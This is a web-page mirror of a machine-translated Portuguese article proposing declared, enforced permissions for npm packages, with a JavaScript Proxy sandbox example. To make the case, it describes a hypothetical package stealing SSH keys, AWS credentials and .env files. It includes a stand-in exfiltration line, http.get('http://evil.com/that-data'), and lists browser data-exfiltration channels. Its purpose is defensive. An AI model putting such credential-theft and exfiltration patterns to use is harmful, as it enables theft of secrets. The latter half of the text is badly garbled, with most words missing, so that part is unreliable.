<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßòüèæ üÜì üõê Tem uma id√©ia: sistema de permiss√£o para pacotes npm üåπ üïõ ü•°</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Alguns dias atr√°s, iniciei a calculadora em um telefone novo e vi a seguinte mensagem: "A calculadora gostaria de acessar seus contatos". 


 A princ√≠...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Tem uma id√©ia: sistema de permiss√£o para pacotes npm</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/433010/">  Alguns dias atr√°s, iniciei a calculadora em um telefone novo e vi a seguinte mensagem: "A calculadora gostaria de acessar seus contatos". <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/bc6/ab2/2fb/bc6ab22fbd46e2703b3d248480a389cf.png"></div><br>  A princ√≠pio, essa mensagem me pareceu um pouco triste (parecia que a calculadora estava solit√°ria), mas esse caso me fez pensar ... <br><a name="habracut"></a><br>  E se, como aplicativos de telefone, os pacotes npm precisassem declarar as permiss√µes necess√°rias para seu trabalho?  Com essa abordagem, o arquivo <code>package.json</code> pode ser algo como isto: <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"fancy-logger"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"version"</span></span>: <span class="hljs-string"><span class="hljs-string">"0.1.0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"permissions"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: [<span class="hljs-string"><span class="hljs-string">"network"</span></span>],   <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: [<span class="hljs-string"><span class="hljs-string">"http"</span></span>, <span class="hljs-string"><span class="hljs-string">"fs"</span></span>] }, <span class="hljs-attr"><span class="hljs-attr">"etcetera"</span></span>: <span class="hljs-string"><span class="hljs-string">"etcetera"</span></span> }</code> </pre> <br>  No <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">npmjs.com, uma</a> se√ß√£o da p√°gina do pacote com informa√ß√µes sobre as permiss√µes necess√°rias pode se parecer com isso. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/9ab/9e6/76d/9ab9e676da3e313c47d59e564afd21bc.png"></div><br>  <i>Essa se√ß√£o de permiss√£o pode estar dispon√≠vel para pacotes no site de registro npm.</i> <br>  Essas listas de permiss√µes para um pacote podem ser uma combina√ß√£o das permiss√µes de todas as suas depend√™ncias com suas pr√≥prias permiss√µes. <br><br>  Uma olhada no conte√∫do da se√ß√£o de <code>permissions</code> do pacote <code>fancy-logger</code> pode fazer o desenvolvedor pensar por que o pacote que grava algo no console precisa acessar o m√≥dulo <code>http</code> e que isso parece um pouco suspeito. <br><br>  Qual seria o mundo em que um sistema de permiss√£o semelhante para pacotes npm seria usado?  Talvez algu√©m n√£o entenda isso, pois se sente completamente seguro, por exemplo, usando apenas pacotes confi√°veis ‚Äã‚Äãde editores testados pelo tempo.  Para que todos que leem isso se sintam vulner√°veis, aqui est√° uma pequena hist√≥ria. <br><br><h2>  <font color="#3AC1EF">A hist√≥ria de como eu roubo suas vari√°veis ‚Äã‚Äãde ambiente</font> </h2><br>  Eu queria criar um pacote npm chamado <code>space-invaders</code> .  Foi interessante aprender a criar jogos escrevendo um jogo que funciona no console e, ao mesmo tempo, comprovar meu ponto de vista sobre vulnerabilidades relacionadas aos pacotes npm. <br><br>  Voc√™ pode executar este jogo com este comando: <code>npx space-invaders</code> .  Ap√≥s o seu lan√ßamento, pode-se come√ßar imediatamente a atirar nos alien√≠genas e matar o tempo. <br><br>  Voc√™ gostaria deste jogo, o compartilharia com os amigos, eles tamb√©m. <br><br>  Tudo isso parece muito positivo, mas, entretendo voc√™, os <code>space-invaders</code> do <code>space-invaders</code> do jogo far√£o suas pr√≥prias <code>space-invaders</code> , a saber, a coleta de alguns dados.  Ele coletar√° informa√ß√µes de <code>~/.ssh/</code> , <code>~/.aws/credentials</code> , de <code>~/.bash_profile</code> e outros locais semelhantes, ler√° o conte√∫do de todos os arquivos <code>.env</code> que puder alcan√ßar, incluindo <code>process.env</code> , procure para a configura√ß√£o do git (para descobrir de quem s√£o as informa√ß√µes coletadas) e, em seguida, ela envia tudo para o meu servidor. <br><br>  N√£o escrevi esse jogo, mas h√° algum tempo me sinto desconfort√°vel e, quando executo o comando <code>npm install</code> , penso em qu√£o vulner√°vel √© o meu sistema.  Agora, olhando para o indicador de progresso da instala√ß√£o, penso em quantas pastas e arquivos padr√£o no meu laptop, cujo conte√∫do n√£o deve cair nas m√£os erradas. <br><br>  E n√£o se trata apenas do meu espa√ßo de trabalho.  Por exemplo, nem sei se existem dados em algumas vari√°veis ‚Äã‚Äãde ambiente do meu sistema de montagem de sites para conectar ao banco de dados do servidor de produ√ß√£o.  Se em algum lugar houver esses dados, voc√™ poder√° imaginar uma situa√ß√£o na qual um pacote npm malicioso instala um script no sistema projetado para conectar-se ao meu banco de dados em funcionamento.  Em seguida, esse script executa o comando <code>SELECT * from users</code> , em seguida, <code>http.get('http://evil.com/that-data')</code> .  Talvez tenha sido justamente pela possibilidade de tais ataques que me deparei com conselhos de que as senhas n√£o deveriam ser armazenadas nos bancos de dados em texto simples? <br><br>  Tudo isso parece bastante assustador e provavelmente j√° est√° acontecendo (embora seja imposs√≠vel dizer exatamente se isso est√° acontecendo ou n√£o). <br><br>  Com isso, talvez, paremos de falar sobre as consequ√™ncias do roubo de dados importantes.  Vamos voltar ao t√≥pico de permiss√µes para pacotes npm. <br><br><h2>  <font color="#3AC1EF">Altera√ß√µes de permiss√£o de bloqueio</font> </h2><br>  Suponho que seria √≥timo poder ver as permiss√µes necess√°rias pelo pacote ao visualizar o site npm.  Mas deve-se notar que a capacidade de ver permiss√µes √© boa somente quando aplicada a um momento espec√≠fico; na verdade, isso n√£o resolve o problema real. <br><br>  Em um incidente recente no npm, algu√©m primeiro publicou uma vers√£o de patch de um pacote com c√≥digo malicioso e depois publicou uma vers√£o secund√°ria da qual o c√≥digo malicioso j√° havia sido removido.  O tempo entre esses dois eventos foi suficiente para colocar em risco muitos usu√°rios do pacote perigoso. <br><br>  Esse √© o problema.  N√£o s√£o pacotes criados por malware e permanecem assim o tempo todo.  O problema √© que, em um pacote aparentemente confi√°vel, voc√™ pode adicionar discretamente algo ruim e depois de um tempo remov√™-lo. <br><br>  Como resultado, podemos dizer que precisamos de um mecanismo para bloquear o conjunto de permiss√µes recebidas pelos pacotes. <br><br>  Talvez seja algo como um arquivo <code>package-permissions.json</code> que defina permiss√µes para o Node.js e para o navegador e contenha uma lista de pacotes que precisam dessas permiss√µes.  Com essa abordagem, seria necess√°rio listar todos os pacotes nesse arquivo, e n√£o apenas aqueles que est√£o na se√ß√£o <code>dependencies</code> do arquivo <code>package.json</code> do projeto. <br><br>  Aqui est√° a apar√™ncia do arquivo <code>package-permissions.json</code> . <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"http"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"express"</span></span>,     <span class="hljs-string"><span class="hljs-string">"stream-http"</span></span>   ],   <span class="hljs-attr"><span class="hljs-attr">"fs"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"fs-extra"</span></span>,     <span class="hljs-string"><span class="hljs-string">"webpack"</span></span>,     <span class="hljs-string"><span class="hljs-string">"node-sass"</span></span>   ] }, <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"network"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"whatwg-fetch"</span></span>,     <span class="hljs-string"><span class="hljs-string">"new-relic"</span></span>   ] } }</code> </pre> <br>  Uma vers√£o real desse arquivo pode conter muito mais entradas de pacote. <br><br>  Agora imagine que um dia voc√™ atualize um pacote com duzentas depend√™ncias que tamb√©m ser√£o atualizadas.  Uma vers√£o do patch foi publicada para uma dessas depend√™ncias, que de repente precisavam de acesso ao <code>http</code> Node.js. <br><br>  Se isso acontecer, o comando <code>npm install</code> falhar√° com uma mensagem semelhante √† seguinte: ‚ÄúO pacote <code>add-two-number</code> necess√°rio pelo pacote <code>fancy-logger</code> solicitou acesso ao <code>http</code> Node.js.  Execute o <code>npm update-permissions add-two-numbers</code> para resolver isso e execute o comando <code>npm install</code> novamente. ‚Äù <br><br>  Aqui, <code>fancy-logger</code> √© o pacote que est√° no seu arquivo <code>package.json</code> (supondo que voc√™ esteja familiarizado com este pacote) e o pacote <code>add-two-numbers</code> √© uma depend√™ncia do <code>fancy-logger</code> que voc√™ nunca ouviu falar. <br><br>  Obviamente, mesmo se houver um arquivo no sistema para "bloquear" as depend√™ncias, alguns desenvolvedores confirmar√£o as novas permiss√µes sem pensar em nada.  Mas, no m√≠nimo, uma altera√ß√£o no <code>package-permissions.json</code> ser√° vis√≠vel na solicita√ß√£o de recebimento, ou seja, haver√° uma chance de que outro desenvolvedor mais respons√°vel preste aten√ß√£o nisso. <br><br>  Al√©m disso, as altera√ß√µes nas permiss√µes solicitadas exigiriam que o pr√≥prio registro npm notificasse os autores do pacote quando uma situa√ß√£o mudar em algum lugar na √°rvore de depend√™ncia de seus pacotes.  Talvez - isso ser√° feito por e-mail com o seguinte conte√∫do: <br><br>  "Ol√°, autor do <code>fancy-logger</code> .  Informamos que o <code>add-two-number</code> , o pacote cujos recursos voc√™ usa, solicitou permiss√£o para trabalhar com o m√≥dulo <code>http</code> .  Suas permiss√µes de pacote, conforme mostrado em <code>npmjs.com/package/fancy-logger</code> , foram atualizadas de acordo. ‚Äù <br><br>  Obviamente, isso aumentar√° o trabalho dos autores dos pacotes e do pr√≥prio npm, mas essas coisas valer√£o a pena gastar um pouco de tempo neles.  Nesse caso, o autor de <code>add-two-numbers</code> pode ter certeza absoluta de que, se solicitar permiss√£o para trabalhar com o m√≥dulo <code>http</code> , isso levar√° ao acionamento de muitos "alarmes" em todo o mundo. <br><br>  √â disso que precisamos.  Hein?  Gostaria de esperar que, como no caso de aplicativos por telefone, e mesmo no caso de extens√µes para o Chrome, pacotes que exijam menos permiss√µes sejam mais populares entre os usu√°rios do que aqueles que precisam de um n√≠vel inexplicavelmente alto de acesso aos sistemas.  Isso, por sua vez, far√° com que os autores do pacote pensem muito bem ao escolher as permiss√µes necess√°rias para seu desenvolvimento. <br><br>  Suponha que o npm decida introduzir um sistema de permiss√£o.  No primeiro dia do lan√ßamento desse sistema, todos os pacotes ser√£o considerados como exigindo permiss√µes completas (tal decis√£o ser√° tomada mais tarde - nos casos em que a se√ß√£o de <code>permissions</code> estiver ausente no <code>package.json</code> ). <br><br>  O autor do pacote, que deseja reivindicar que seu pacote n√£o requer permiss√µes especiais, estar√° interessado em adicionar a se√ß√£o de <code>permissions</code> no <code>package.json</code> como um objeto vazio.  E, se os autores dos pacotes estiverem interessados ‚Äã‚Äão suficiente para que as permiss√µes de depend√™ncia n√£o sobrecarreguem seus pacotes, eles tentar√£o garantir que esses pacotes de depend√™ncia tamb√©m n√£o exijam permiss√µes especiais, por exemplo, fazendo solicita√ß√µes de recebimento apropriadas no reposit√≥rio de depend√™ncias. <br><br>  Al√©m disso, cada autor do pacote se esfor√ßar√° para reduzir o risco de vulnerabilidade do pacote ao quebrar uma de suas depend√™ncias.  Portanto, se os autores dos pacotes usarem depend√™ncias que exigem permiss√µes, as quais, aparentemente, n√£o s√£o necess√°rias, elas ter√£o um incentivo para mudar para o uso de outros pacotes. <br><br>  E no caso de desenvolvedores que usam o npm-packages ao criar aplicativos, isso os for√ßar√° a prestar aten√ß√£o especial aos pacotes usados ‚Äã‚Äãem seus projetos, escolhendo principalmente aqueles que n√£o requerem permiss√µes especiais.  Ao mesmo tempo, √© claro, alguns pacotes, por raz√µes objetivas, exigir√£o permiss√µes que podem causar problemas, mas √© prov√°vel que esses pacotes estejam sob controle especial dos desenvolvedores. <br><br>  Talvez algo como o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Greenkeeper</a> possa ajudar de alguma maneira a resolver todos esses problemas. <br><br>  Por fim, o arquivo <code>package-permissions.json</code> fornecer√° um resumo f√°cil de entender para um profissional de seguran√ßa que avaliar poss√≠veis ‚Äúbrechas‚Äù no aplicativo e permitir que voc√™ fa√ßa perguntas espec√≠ficas sobre pacotes controversos e suas permiss√µes. <br><br>  Como resultado, espero que essa propriedade de <code>permissions</code> simples possa se espalhar amplamente entre aproximadamente pacotes de 800.000 npm e torn√°-lo mais seguro. <br><br>  Obviamente, isso n√£o impedir√° poss√≠veis ataques.  Assim como as permiss√µes solicitadas pelos aplicativos m√≥veis n√£o tornam imposs√≠vel a cria√ß√£o de aplicativos m√≥veis maliciosos distribu√≠dos por sites oficiais.  Mas isso restringir√° a "superf√≠cie de ataque" a pacotes que solicitam permiss√£o explicitamente para executar determinadas a√ß√µes que podem representar uma amea√ßa para os sistemas de computador.  Al√©m disso, ser√° interessante aprender sobre qual porcentagem de pacotes n√£o precisa de permiss√µes especiais. <br><br>  √â assim que parece o mecanismo para trabalhar com permiss√µes para pacotes npm.  Se essa id√©ia se tornar realidade, podemos confiar no fato de que os invasores descrever√£o honestamente seus pacotes declarando permiss√µes ou combinar o sistema de declara√ß√£o de permiss√µes com o mecanismo de restri√ß√£o for√ßada dos recursos dos pacotes de acordo com as permiss√µes solicitadas por eles.  Esta √© uma pergunta interessante.  Vejamos como aplicado ao Node.js e navegadores. <br><br><h2>  <font color="#3AC1EF">For√ßando restri√ß√µes de pacote de acordo com as permiss√µes solicitadas por eles no Node.js</font> </h2><br>  Aqui eu vejo duas op√ß√µes poss√≠veis para aplicar essas restri√ß√µes. <br><br><h3>  <font color="#3AC1EF">‚ñç Op√ß√£o 1: pacote npm especial que for√ßa medidas de seguran√ßa</font> </h3><br>  Imagine um pacote criado e mantido pelo npm (ou alguma outra organiza√ß√£o igualmente autorit√°ria e vision√°ria).  Deixe este pacote ser chamado <code>@npm/permissions</code> . <br><br>  Esse pacote seria inclu√≠do no c√≥digo do aplicativo com o primeiro comando de importa√ß√£o ou os aplicativos seriam iniciados com um comando no formato <code>node -r @npm/permissions index.js</code> . <br><br>  Um pacote substituiria outros comandos de importa√ß√£o para que eles n√£o violassem as permiss√µes indicadas na se√ß√£o de <code>permissions</code> dos arquivos <code>package.json</code> de outros pacotes.  Se o autor de um determinado pacote <code>lovely-logger</code> n√£o declarar a necessidade desse pacote no m√≥dulo <code>http</code> Node.js., isso significa que esse pacote n√£o pode ser acessado por este m√≥dulo. <br><br>  A rigor, bloquear m√≥dulos Node.js inteiros dessa maneira n√£o √© o ideal.  Por exemplo, o pacote de <code>methods</code> npm carrega o m√≥dulo <code>http</code> Node.js., mas n√£o envia dados usando-o.  Ele apenas pega o objeto <code>http.METHODS</code> , converte seu nome em <code>http.METHODS</code> e o exporta como um pacote npm cl√°ssico.  Agora, esse pacote parece ser um √≥timo alvo para um invasor - ele tem 6 milh√µes de downloads por semana, enquanto n√£o muda h√° 3 anos.  Eu poderia escrever para os autores deste pacote e convid√°-los a me fornecer seu reposit√≥rio. <br><br>  Considerando o pacote de <code>methods</code> , seria melhor considerar que ele n√£o requer permiss√£o de <code>network</code> e n√£o a permiss√£o que d√° acesso ao m√≥dulo <code>http</code> .  Em seguida, essa restri√ß√£o pode ser corrigida usando um mecanismo externo e neutralizar qualquer tentativa deste pacote de enviar determinados dados dos sistemas em que trabalha. <br><br>  O pacote imagin√°rio <code>@npm/permissions</code> tamb√©m pode restringir o acesso de um pacote a quaisquer outros pacotes que n√£o foram listados como suas depend√™ncias.  Isso impedir√° que o pacote, por exemplo, importe algo como <code>fs-extra</code> e <code>request</code> , e use os recursos desses pacotes para ler dados do sistema de arquivos e enviar dados de leitura para um invasor. <br><br>  Da mesma forma, pode ser √∫til distinguir entre acesso ao disco "interno" e "externo".  Estou muito feliz que o <code>node-sass</code> precise acessar os materiais localizados no diret√≥rio do meu projeto, mas n√£o vejo os motivos pelos quais esse pacote precisa acessar qualquer coisa fora deste diret√≥rio. <br><br>  Talvez, no in√≠cio da introdu√ß√£o do sistema de permiss√µes, o pacote <code>@npm/permissions</code> precise ser adicionado aos projetos manualmente.  Talvez, durante o per√≠odo de transi√ß√£o, durante a elimina√ß√£o de falhas inevit√°veis, essa seja a √∫nica abordagem razo√°vel para usar esse mecanismo.  Mas, para garantir a seguran√ßa real, √© necess√°rio que este pacote seja totalmente integrado ao sistema, pois ser√° necess√°rio levar em considera√ß√£o as permiss√µes ao executar os scripts de instala√ß√£o do pacote. <br><br>  Ent√£o, o mais prov√°vel √© que um simples comando no formato <code>"enforcePermissions": true</code> no arquivo <code>package.json</code> do projeto diga ao npm para executar qualquer script com o uso for√ßado das permiss√µes declaradas por eles. <br><br><h3>  <font color="#3AC1EF">‚ñç Op√ß√£o 2: Modo de seguran√ßa Node.js</font> </h3><br>  O modo especial de opera√ß√£o do Node.js, focado em um n√≠vel aumentado de seguran√ßa, obviamente exigir√° mudan√ßas mais s√©rias.  Mas talvez a longo prazo, a pr√≥pria plataforma Node.js. possa impor restri√ß√µes definidas pelas permiss√µes declaradas por cada pacote. <br><br>  Por um lado, sei que aqueles que est√£o desenvolvendo a plataforma Node.j se esfor√ßam para resolver os problemas dessa plataforma, e minhas id√©ias sobre a seguran√ßa dos pacotes npm v√£o al√©m do escopo de seus interesses.  Afinal, no final, npm √© apenas a tecnologia que acompanha o Node.js.  Por outro lado, os desenvolvedores do Node.js. est√£o interessados ‚Äã‚Äãem fazer com que os usu√°rios corporativos se sintam confiantes ao trabalhar com esta plataforma, e a seguran√ßa, presumivelmente, √© um daqueles aspectos do Node.js. que n√£o devem ser dados √† "comunidade". <br><br>  Portanto, enquanto tudo o que conversamos parecia bem simples e resumia-se ao fato de que o sistema, de uma maneira ou de outra, seguia os recursos usados ‚Äã‚Äãpelos m√≥dulos durante a opera√ß√£o do Node.js. <br><br>  Agora vamos falar sobre navegadores.  Tudo aqui n√£o parece t√£o claro e compreens√≠vel. <br><br><h2>  <font color="#3AC1EF">Restri√ß√£o for√ßada dos recursos dos pacotes de acordo com as permiss√µes solicitadas nos navegadores</font> </h2><br>  √Ä primeira vista, a restri√ß√£o for√ßada dos recursos dos pacotes nos navegadores parece ainda mais simples, pois o c√≥digo que √© executado no navegador n√£o pode fazer muito, especialmente em rela√ß√£o ao sistema operacional no qual o navegador √© executado.  De fato, no caso de navegadores, voc√™ s√≥ precisa se preocupar com a capacidade dos pacotes de transferir dados para endere√ßos incomuns. <br><br>  O problema aqui √© que existem in√∫meras maneiras de enviar dados do navegador do usu√°rio para o servidor do invasor. <br><br>  Isso se chama exfiltra√ß√£o ou vazamento de dados e, se voc√™ perguntar a um profissional de seguran√ßa sobre como evitar isso, ele, com a apar√™ncia da pessoa que inventou a p√≥lvora, solicitar√° que voc√™ pare de usar o npm. <br><br>  Acredito que, para pacotes executados em navegadores, √© necess√°rio prestar aten√ß√£o a apenas uma resolu√ß√£o - a respons√°vel pela capacidade de trabalhar com a rede.  Vamos cham√°-lo de <code>network</code> .  Pode haver outras permiss√µes nesse ambiente (como aquelas que regulam o acesso ao DOM ou armazenamento local), mas aqui procedo da suposi√ß√£o de que nossa principal preocupa√ß√£o √© a possibilidade de vazamento de dados. <br><br>  Os dados do navegador podem ser "removidos" de v√°rias maneiras.  Aqui est√£o os que eu conseguia lembrar em 60 segundos: <br><br><ul><li>  <code>fetch</code> API. </li><li>  Soquetes da Web </li><li>  Tecnologia WebRTC. </li><li>  Construtor de <code>EventSource</code> . </li><li>  API <code>XMLHttpRequest</code> </li><li>  Configurando a propriedade <code>innerHTML</code> de v√°rios elementos (voc√™ pode criar novos elementos). </li><li>  Criando um objeto de imagem com o <code>new Image()</code> comando <code>new Image()</code> (a propriedade <code>src</code> de uma imagem pode servir como um meio de filtrar dados). </li><li>  Definir <code>document.location</code> , <code>window.location</code> e assim por diante. </li><li>  Alterando as propriedades <code>src</code> de uma imagem existente, <code>iframe</code> ou algo parecido. </li><li>  Altera√ß√µes na propriedade de <code>target</code> do elemento <code>&lt;form&gt;</code> . </li><li>  Usando uma string inteligentemente projetada para acessar qualquer um dos mecanismos acima ou para acessar algo em <code>top</code> ou em <code>self</code> vez de <code>windows</code> . </li></ul><br>  Deve-se observar que uma boa Pol√≠tica de Seguran√ßa de Conte√∫do (CSP) √© capaz de neutralizar algumas dessas amea√ßas, mas isso n√£o se aplica a todas elas.  Se algu√©m puder me corrigir, ficarei feliz, mas acredito que voc√™ nunca pode confiar no fato de que o CSP o proteger√° completamente do vazamento de dados.  Uma pessoa me disse uma vez que o CSP fornece prote√ß√£o quase completa contra um grande n√∫mero de amea√ßas.  Respondi a isso que voc√™ n√£o pode estar um pouco gr√°vida e, desde ent√£o, n√£o nos comunicamos com essa pessoa. <br><br>  Se voc√™ abordar com sabedoria a pesquisa de maneiras de roubar dados do navegador, tenho certeza de que √© bastante realista fazer uma lista bastante completa desses m√©todos. <br><br>  Agora, precisamos encontrar um mecanismo para negar o acesso ao uso de oportunidades de uma lista semelhante. <br><br>        Webpack (,    <code>@npm/permissions-webpack-plugin</code> ),     : <br><br><ul><li>         <code>browser</code>  <code>package-permissions.json</code>   ,  npm-      (  -  ,  ). </li><li>  ,   ,     ,        API,        . </li></ul><br> (,       Parcel, Rollup, Browserify     ). <br><br> , ,     -.    ,          ,        , , ,        . <br><br>   ,        ( Lodash, Moment,   ),       .        . <br><br>            . <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//   (),   ,    function bigFrameworkWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //      const firstDiv = document.querySelector('div'); //    }, }; return module; } //   ( ),   ,    function smallUtilWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //  !     const firstDiv = document.querySelector('div'); //    }, }; return module; } const restrictedWindow = new Proxy(window, { get(target, prop, receiver) {   if (prop === 'document') {     return new Proxy(target.document, {       get(target, prop, receiver) {         if (prop === 'createElement') {           return new Proxy(window.document.createElement, {             apply(target, thisArg, argumentsList) {               if (['script', 'img', 'audio', 'and-so-on'].includes(argumentsList[0])) {                 console.error('A module without permissions attempted to create a naughty element');                 return false;               }               return target.apply(window.document, argumentsList);             },           });         }         const result = Reflect.get(target, prop, receiver);         if (typeof result === 'function') return result.bind(target);         return result;       },     });   }   return Reflect.get(target, prop, receiver); }, }); const bigFramework = bigFrameworkWrapper(window); bigFramework.doSomething(); //   const smallUtil = smallUtilWrapper(restrictedWindow); smallUtil.doSomething(); // ! "A module without permissions attempted to create a naughty element"</span></span></code> </pre> <br>  <code>function bigFrameworkWrapper(newWindow) {</code>  <code>function smallUtilWrapper(newWindow) {</code> ‚Äî  ,    .  ¬´¬ª      . <br><br>   <code>const newScript = document.createElement('script'); //  !</code>  ,         ‚Äî    <code>script</code> . <br><br>   <code>const bigFramework = bigFrameworkWrapper(window);</code>  <code>const smallUtil = smallUtilWrapper(restrictedWindow);</code>  ¬´¬ª     . ,      ,    . <br><br>   <code>const restrictedWindow = new Proxy(window, {</code>    <code>window</code> ,    ,     <code>window</code> ,   ,           <code>window.document.createElement</code>    DOM  . <br><br>     <code>Proxy</code> . <br><br>       .         ,           . <br><br> ,   ,       API,      .   ,     ,   ,  ,  ,     ,        ,    ,   ,     ,  ¬´¬ª   . <br><br>      ,   ,     ,   -     . <br><br> , ,  ,        ,       <code>Proxy</code> . ,      90% ,   .        ,         ,   . ,    -   ,             ,   ,  . <br><br>  ,   , ,       ,     ,              Node.js       . <br><br><h2> <font color="#3AC1EF"> </font> </h2><br>  ,   ,    HTTP   ,  , ,          -.  Isso √© compreens√≠vel. <br><br>     -,   ,  ,              .    <code>iframe</code> ,    .     <code>sandbox</code> ,    ,     .  ,    ,   ,     -. <br><br> ,   ,     <code>sandbox</code>  <code>&lt;script&gt;</code> .     : <code>&lt;script src="/some-package.js" sandbox="allow-exfiltration allow-whatevs"&gt;&lt;script&gt;</code> .      ,       ,      ,      - <code>create-react-app</code> ,   1.4   ,          . <br><br>     ,            npm  ,      . <br><br>  ,      -  . <br><br> ,  ,    -    ¬´ ...¬ª,     ,   ,       ? <br><br><h2>  <font color="#3AC1EF">Sum√°rio</font> </h2><br>  ,   ,     , ,              .      ,  90% ,   ,    ,    10% ‚Äî ,    . <br><br> ,          ,           -  . <br><br>  <b>Caros leitores!</b>   ,  ,       npm,   -? <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><img src="https://habrastorage.org/files/1ba/550/d25/1ba550d25e8846ce8805de564da6aa63.png"></a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt433010/">https://habr.com/ru/post/pt433010/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt432998/index.html">Hist√≥ria de natal</a></li>
<li><a href="../pt433000/index.html">Compilando o Kotlin: JetBrains x ANTLR x JavaCC</a></li>
<li><a href="../pt433002/index.html">Venha voc√™ mesmo ... ou as regras de comunica√ß√£o em uma equipe</a></li>
<li><a href="../pt433004/index.html">Uma estrat√©gia robusta de migra√ß√£o da nuvem para 2019: 7 dicas</a></li>
<li><a href="../pt433008/index.html">Os dispositivos USB s√£o uma amea√ßa "repentina"</a></li>
<li><a href="../pt433012/index.html">Talvez eu s√≥ esteja vivo por causa dela: por que os pacientes com apneia dependem de um programa escrito por um hacker</a></li>
<li><a href="../pt433014/index.html">Piadas sobre o recente lan√ßamento de astronautas no espa√ßo sideral</a></li>
<li><a href="../pt433016/index.html">Altera√ß√µes na interface, anima√ß√£o em camadas e caos visual estruturado: uma revis√£o das tend√™ncias da web para 2019</a></li>
<li><a href="../pt433018/index.html">UDB. O que √© isso? Parte 2. Caminho de Dados</a></li>
<li><a href="../pt433030/index.html">Ao vivo: desempenho front-end</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
